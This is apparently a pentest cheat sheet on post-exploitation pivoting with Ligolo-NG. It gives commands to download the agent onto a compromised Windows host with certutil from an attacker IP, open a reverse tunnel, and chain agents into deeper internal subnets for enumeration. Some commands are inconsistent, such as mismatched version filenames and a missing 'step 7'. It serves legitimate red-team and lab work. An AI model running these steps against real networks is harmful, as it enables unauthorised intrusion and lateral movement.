## Interfaces

This is a list of interfaces found on the compromised machine. It could be useful for easier navigation of internal networks: which interface to run a redirector on, which networks are potentially accessible via this particular session and so on.

## Routes

A list of routes is here mainly for visibility purposes: as already mentioned, the selection highlight is synchronized with sessions and redirectors, also the visual markers (those colored flags) provide a good visual representation of the current state.

Its context menu allows for deletion of selected route.

## Redirectors

This is functionally the same as routes, but represents redirectors.

Its context menu allows for deletion of selected route.



## Ligolo-NG

[Ligolo-ng webUI Documentation](https://docs.ligolo.ng/webui/)

### Step 1: Download Ligolo-NG Binaries
Ligolo-NG consists of two core components:

    Proxy → Runs on the attacker machine (our system).
    Agent → Runs on the target machine (compromised host).

On the Attacker Machine (Kali/Linux)

Navigate to a directory to store Ligolo-NG:
```bash
cd /opt
mkdir ligolo
cd ligolo
```
Download the proxy and agent binaries:
```bash
# Download the agent (for Windows target)
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_windows_amd64.zip

# Download the proxy (for Kali/attacker machine)
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
```
Extract the binaries:
```bash
# Extract the agent (for Windows target)
unzip ligolo-ng_agent_0.8_windows_amd64.zip

# Extract the proxy (for Kali/attacker machine)
tar -xvf ligolo-ng_proxy_0.8_linux_amd64.tar.gz
```
### Step 2: Set Up the Ligolo-NG Proxy on the Attacker Machine
Before launching Ligolo-NG, create a TUN interface on the attacker machine:
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```
Now, start the Ligolo-NG proxy server:
```bash
#Change the directory to the ligolo directory
cd /opt/ligolo
#Run the proxy server from there
./proxy -selfcert
```
### Step 3: Transfer the Ligolo-NG Agent on the Target Machine
We need to transfer the agent to the compromised machine using a simple Python HTTP server to serve the file:
```bash
*** Note : In our case we directly copied it to the windows Compromised machine ***
cd /opt/ligolo
sudo python3 -m http.server 80
```
On the target machine (Windows), download the agent from the attacker’s machine:
```bash
certutil.exe -urlcache -split -f http://<attacker_IP>/lin-agent
```
### Step 4: Pivot to First Subnet
Now, execute the agent and connect it to the attacker’s proxy:
```bash
agent.exe -connect <attacker-machine-IP>:11601 -ignore-cert
```

Verify the Connection:<br>
Once the agent is running, check the attacker machine’s proxy window. An active session should have been established. To list all active tunneled sessions, run:
```bash
#List the session
session
```
```bash
#Start the session
start
```

### Step 5: Discover Internal Networks
Now that there is a foothold inside the compromised network, let’s enumerate.

On the Target Machine:

check network interfaces:
```powershell
ipconfig
```
![](/images/cheatsheets/Ligolo/Blog32-6.webp)
This will help identify additional subnets or networks to pivot into.
### Step 6: Add Internal Network Routes for Pivoting
Once internal network is identified (e.g., 172.168.170.0/24), route it through Ligolo-NG:
```bash
sudo ip route add 172.168.170.0/24 dev ligolo
```
### Pivoting to a Second Subnet
Once the second machine inside a new internal subnet has been compromised, Let’s set up another Ligolo listener and agent to continue pivoting deeper.

Why? : The first agent is limited to the subnet it can see. To reach the next layer (deeper network), we need to tunnel again — from the foothold machine.

Setting up Additional Ligolo Listeners and Agents (ligolo2, ligolo3)

Set up a second Ligolo tunnel after a successful RDP into the second compromised machine (e.g., wkstn4 with IP 172.168.170.120) :

On the attacker machine (Kali):
```bash
#Create a second TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
#Attach back to running Ligolo proxy tmux session
tmux a -t Ligolo
# Add a new listener
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
#Verify listeners
listener_list
```
On the new compromised machine <br>
Download and execute the Ligolo agent to create the second tunnel:
```bash
agent.exe -connect <WEBSERVER>:11601 -ignore-cert
```
On the attacker machine, start the session:
```bash
session

start --tun ligolo2
```
Add the new internal network to your routes:
```bash
sudo ip route add 10.10.10.0/24 dev ligolo2
```
Confirm connectivity:
```bash
ping 10.10.10.128
```
Enumerate the new network:
```bash
nxc smb 10.10.10.0/24
```

### Pivoting to a Multiple Subnets

Repeat for Deeper Networks

Similarly, if another host is compromised (e.g., CA.SHIELD.LOCAL machine at 10.10.10.132) and find another new network (10.10.20.0/24), repeat the same process from step 7:

    Create a third TUN interface (ligolo3)
    Start a new listener
    Deploy another agent from the compromised machine
    Route the new subnet through the new TUN (ligolo3) interface

Final setup : Fully Established Pivot Chain Across Four Networks
